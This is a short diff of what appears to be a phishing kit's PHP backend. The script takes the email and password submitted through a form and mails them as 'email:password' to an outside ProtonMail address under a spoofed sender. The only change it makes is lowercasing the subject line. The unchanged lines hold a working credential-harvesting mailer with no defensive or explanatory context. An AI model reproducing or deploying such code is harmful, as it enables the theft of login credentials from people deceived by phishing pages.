@@ -2,7 +2,7 @@
 $email = $_POST["email"]
 $password = $_POST["password"]
 $to = "ghestmany@proton.me"
-$subject = "Login informations"
+$subject = "login informations"
 $message = "$email:$password"
 $header = "From: feet@gmail.com". "\r\n" .
 	"Reply-To: feet@gmail.com";
